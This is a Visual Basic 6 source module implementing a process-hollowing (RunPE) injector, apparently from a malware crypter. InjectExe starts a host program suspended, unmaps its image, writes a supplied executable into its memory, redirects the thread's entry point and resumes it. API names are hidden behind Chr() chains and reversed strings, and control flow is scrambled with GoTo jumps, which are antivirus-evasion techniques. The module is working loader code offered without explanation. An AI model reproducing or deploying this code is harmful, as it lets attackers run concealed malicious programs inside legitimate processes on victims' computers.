Attribute VB_Name = "Module2"
Option Explicit

Private Const CONTEXT_FULL              As Long = &H10007
Private Const MAX_PATH                  As Integer = 260
Private Const CREATE_SUSPENDED          As Long = &H4
Private Const MEM_COMMIT                As Long = &H1000
Private Const MEM_RESERVE               As Long = &H2000
Private Const PAGE_EXECUTE_READWRITE    As Long = &H40

Private Declare Function CallWindowProcA Lib "user32" (ByVal addr As Long, ByVal p1 As Long, ByVal p2 As Long, ByVal p3 As Long, ByVal p4 As Long) As Long
Public Declare Sub RtlMoveMemory Lib "kernel32" (Dest As Any, Src As Any, ByVal L As Long)
Private Declare Function WriteProcessMemory Lib "kernel32" (ByVal hProcess As Long, lpBaseAddress As Any, bvBuff As Any, ByVal nSize As Long, lpNumberOfBytesWritten As Long) As Long
Private Declare Function LoadLibraryA Lib "kernel32" (ByVal lpLibFileName As String) As Long
Private Declare Function GetProcAddress Lib "kernel32" (ByVal hModule As Long, ByVal lpProcName As String) As Long
Private Declare Function CreateProcessA Lib "kernel32" (ByVal lpAppName As String, ByVal lpCommandLine As String, ByVal lpProcessAttributes As Long, ByVal lpThreadAttributes As Long, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, ByVal lpEnvironment As Long, ByVal lpCurrentDirectory As Long, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As Long


Private Type SECURITY_ATTRIBUTES
    nLength As Long
    lpSecurityDescriptor As Long
    bInheritHandle As Long
End Type

Private Type STARTUPINFO
    cb As Long
    lpReserved As Long
    lpDesktop As Long
    lpTitle As Long
    dwX As Long
    dwY As Long
    dwXSize As Long
    dwYSize As Long
    dwXCountChars As Long
    dwYCountChars As Long
    dwFillAttribute As Long
    dwFlags As Long
    wShowWindow As Integer
    cbReserved2 As Integer
    lpReserved2 As Long
    hStdInput As Long
    hStdOutput As Long
    hStdError As Long
End Type

Private Type PROCESS_INFORMATION
    hProcess As Long
    hThread As Long
    dwProcessID As Long
    dwThreadID As Long
End Type

Private Type FLOATING_SAVE_AREA
    ControlWord As Long
    StatusWord As Long
    TagWord As Long
    ErrorOffset As Long
    ErrorSelector As Long
    DataOffset As Long
    DataSelector As Long
    RegisterArea(1 To 80) As Byte
    Cr0NpxState As Long
End Type

Private Type CONTEXT
    ContextFlags As Long

    Dr0 As Long
    Dr1 As Long
    Dr2 As Long
    Dr3 As Long
    Dr6 As Long
    Dr7 As Long

    FloatSave As FLOATING_SAVE_AREA
    SegGs As Long
    SegFs As Long
    SegEs As Long
    SegDs As Long
    Edi As Long
    Esi As Long
    Ebx As Long
    Edx As Long
    Ecx As Long
    Eax As Long
    Ebp As Long
    Eip As Long
    SegCs As Long
    EFlags As Long
    Esp As Long
    SegSs As Long
End Type

Private Type IMAGE_DOS_HEADER
    e_magic As Integer
    e_cblp As Integer
    e_cp As Integer
    e_crlc As Integer
    e_cparhdr As Integer
    e_minalloc As Integer
    e_maxalloc As Integer
    e_ss As Integer
    e_sp As Integer
    e_csum As Integer
    e_ip As Integer
    e_cs As Integer
    e_lfarlc As Integer
    e_ovno As Integer
    e_res(0 To 3) As Integer
    e_oemid As Integer
    e_oeminfo As Integer
    e_res2(0 To 9) As Integer
    e_lfanew As Long
End Type

Private Type IMAGE_FILE_HEADER
    Machine As Integer
    NumberOfSections As Integer
    TimeDateStamp As Long
    PointerToSymbolTable As Long
    NumberOfSymbols As Long
    SizeOfOptionalHeader As Integer
    characteristics As Integer
End Type

Private Type IMAGE_DATA_DIRECTORY
    VirtualAddress As Long
    Size As Long
End Type

Private Type IMAGE_OPTIONAL_HEADER
    Magic As Integer
    MajorLinkerVersion As Byte
    MinorLinkerVersion As Byte
    SizeOfCode As Long
    SizeOfInitializedData As Long
    SizeOfUnitializedData As Long
    AddressOfEntryPoint As Long
    BaseOfCode As Long
    BaseOfData As Long
    ' NT additional fields.
    ImageBase As Long
    SectionAlignment As Long
    FileAlignment As Long
    MajorOperatingSystemVersion As Integer
    MinorOperatingSystemVersion As Integer
    MajorImageVersion As Integer
    MinorImageVersion As Integer
    MajorSubsystemVersion As Integer
    MinorSubsystemVersion As Integer
    W32VersionValue As Long
    SizeOfImage As Long
    SizeOfHeaders As Long
    CheckSum As Long
    SubSystem As Integer
    DllCharacteristics As Integer
    SizeOfStackReserve As Long
    SizeOfStackCommit As Long
    SizeOfHeapReserve As Long
    SizeOfHeapCommit As Long
    LoaderFlags As Long
    NumberOfRvaAndSizes As Long
    DataDirectory(0 To 15) As IMAGE_DATA_DIRECTORY
End Type

Private Type IMAGE_NT_HEADERS
    Signature As Long
    FileHeader As IMAGE_FILE_HEADER
    OptionalHeader As IMAGE_OPTIONAL_HEADER
End Type

Private Type IMAGE_SECTION_HEADER
    SecName As String * 8
    VirtualSize As Long
    VirtualAddress  As Long
    SizeOfRawData As Long
    PointerToRawData As Long
    PointerToRelocations As Long
    PointerToLinenumbers As Long
    NumberOfRelocations As Integer
    NumberOfLinenumbers As Integer
    characteristics  As Long
End Type

Sub InjectExe(ByVal sHost As String, ByRef bvBuff() As Byte)
    Dim Si      As STARTUPINFO
    Dim Ctx     As CONTEXT
    Dim Pinh    As IMAGE_NT_HEADERS
    Dim Pish    As IMAGE_SECTION_HEADER
    Dim i       As Long
    Dim Pi      As PROCESS_INFORMATION
    Dim Pidh    As IMAGE_DOS_HEADER


    Si.cb = Len(Si)

GoTo OXLL_35182
NYWH_34826:
GoTo JUMI_77483
JUMI_77483:
    CallAPI StrReverse(StrReverse(StrReverse("lldtn"))), Chr(78) & Chr(116) & Chr(85) & Chr(110) & Chr(109) & Chr(97) & Chr(112) & Chr(86) & Chr(105) & Chr(101) & Chr(119) & Chr(79) & Chr(102) & Chr(83) & Chr(101) & Chr(99) & Chr(116) & Chr(105) & Chr(111) & Chr(110), Pi.hProcess, Pinh.OptionalHeader.ImageBase
GoTo QIMF_81888
QYBO_82441:
    RtlMoveMemory Pidh, bvBuff(0), 64
GoTo QJUI_38666
QIMF_81888:
    CallAPI Chr(107) & Chr(101) & Chr(114) & Chr(110) & Chr(101) & Chr(108) & Chr(51) & Chr(50), Chr(86) & Chr(105) & Chr(114) & Chr(116) & Chr(117) & Chr(97) & Chr(108) & Chr(65) & Chr(108) & Chr(108) & Chr(111) & Chr(99) & Chr(69) & Chr(120), Pi.hProcess, Pinh.OptionalHeader.ImageBase, Pinh.OptionalHeader.SizeOfImage, MEM_COMMIT Or MEM_RESERVE, PAGE_EXECUTE_READWRITE
GoTo PPVK_07850
OXLL_35182:
GoTo QYBO_82441
QJUI_38666:
    RtlMoveMemory Pinh, bvBuff(Pidh.e_lfanew), 248
GoTo UOXB_32829
PPVK_07850:
    WriteProcessMemory Pi.hProcess, ByVal Pinh.OptionalHeader.ImageBase, bvBuff(0), Pinh.OptionalHeader.SizeOfHeaders, 0
GoTo FDLQ_48288
UOXB_32829:
    CreateProcessA sHost, vbNullString, 0, 0, False, CREATE_SUSPENDED, 0, 0, Si, Pi
GoTo NYWH_34826
FDLQ_48288:


    For i = 0 To Pinh.FileHeader.NumberOfSections - 1
GoTo ABFY_69117
RWMK_74635:
        WriteProcessMemory Pi.hProcess, ByVal Pinh.OptionalHeader.ImageBase + Pish.VirtualAddress, bvBuff(Pish.PointerToRawData), Pish.SizeOfRawData, 0
GoTo APJP_28185
KORV_81824:
GoTo RWMK_74635
APJP_28185:
GoTo ASSA_82451
ABFY_69117:
        RtlMoveMemory Pish, bvBuff(Pidh.e_lfanew + 248 + 40 * i), Len(Pish)
GoTo KORV_81824
ASSA_82451:
    Next i

GoTo ULPJ_14007
VUGF_81277:
GoTo INAC_28428
INAC_28428:
    Ctx.Eax = Pinh.OptionalHeader.ImageBase + Pinh.OptionalHeader.AddressOfEntryPoint
GoTo GANT_23683
NPES_52379:
    Ctx.ContextFlags = CONTEXT_FULL
GoTo QDAR_75620
GANT_23683:
    CallAPI StrReverse(StrReverse(StrReverse("23lenrek"))), Chr(83) & Chr(101) & Chr(116) & Chr(84) & Chr(104) & Chr(114) & Chr(101) & Chr(97) & Chr(100) & Chr(67) & Chr(111) & Chr(110) & Chr(116) & Chr(101) & Chr(120) & Chr(116), Pi.hThread, VarPtr(Ctx)
GoTo BSRD_21680
ULPJ_14007:
GoTo NPES_52379
QDAR_75620:
    CallAPI StrReverse(StrReverse(StrReverse("23lenrek"))), Chr(71) & Chr(101) & Chr(116) & Chr(84) & Chr(104) & Chr(114) & Chr(101) & Chr(97) & Chr(100) & Chr(67) & Chr(111) & Chr(110) & Chr(116) & Chr(101) & Chr(120) & Chr(116), Pi.hThread, VarPtr(Ctx)
GoTo BVPB_80311
BSRD_21680:
    CallAPI StrReverse(StrReverse(StrReverse("23lenrek"))), Chr(82) & Chr(101) & Chr(115) & Chr(117) & Chr(109) & Chr(101) & Chr(84) & Chr(104) & Chr(114) & Chr(101) & Chr(97) & Chr(100), Pi.hThread
GoTo QMBP_77566
BVPB_80311:
    WriteProcessMemory Pi.hProcess, ByVal Ctx.Ebx + 8, Pinh.OptionalHeader.ImageBase, 4, 0
GoTo VUGF_81277
QMBP_77566:

End Sub

Private Function CallAPI(ByVal sLib As String, ByVal sMod As String, ParamArray Params()) As Long
    Dim lPtr                As Long
    Dim bvASM(&HEC00& - 1)  As Byte
    Dim i                   As Long
    Dim lMod                As Long
    
    lMod = GetProcAddress(LoadLibraryA(sLib), sMod)
    If lMod = 0 Then Exit Function
    
    lPtr = VarPtr(bvASM(0))
    RtlMoveMemory ByVal lPtr, &H59595958, &H4:              lPtr = lPtr + 4
    RtlMoveMemory ByVal lPtr, &H5059, &H2:                  lPtr = lPtr + 2
    For i = UBound(Params) To 0 Step -1
        RtlMoveMemory ByVal lPtr, &H68, &H1:                lPtr = lPtr + 1
        RtlMoveMemory ByVal lPtr, CLng(Params(i)), &H4:     lPtr = lPtr + 4
    Next
GoTo KWBH_84583
YREX_72252:
    CallAPI = CallWindowProcA(VarPtr(bvASM(0)), 0, 0, 0, 0)
GoTo GHGU_19884
KWBH_84583:
GoTo EKBT_78874
FPPX_16738:
    RtlMoveMemory ByVal lPtr, lMod - lPtr - 4, &H4:         lPtr = lPtr + 4
GoTo AMEC_93436
AMEC_93436:
GoTo TXCV_24184
TXCV_24184:
    RtlMoveMemory ByVal lPtr, &HC3, &H1:                    lPtr = lPtr + 1
GoTo YREX_72252
EKBT_78874:
    RtlMoveMemory ByVal lPtr, &HE8, &H1:                    lPtr = lPtr + 1
GoTo FPPX_16738
GHGU_19884:

End Function

Public Function ThisExe() As String
    Dim lRet        As Long
    Dim bvBuff(255) As Byte
GoTo QWRV_87355
ETLI_26960:
    ThisExe = Left$(StrConv(bvBuff, vbUnicode), lRet)
GoTo WFTH_44132
EWSH_15521:
GoTo ETLI_26960
WFTH_44132:
GoTo HNGB_42672
QWRV_87355:
    lRet = CallAPI(StrReverse(StrReverse(StrReverse("23lenrek"))), StrReverse(StrReverse(StrReverse("AemaNeliFeludoMteG"))), App.hInstance, VarPtr(bvBuff(0)), 256)
GoTo EWSH_15521
HNGB_42672:

End Function




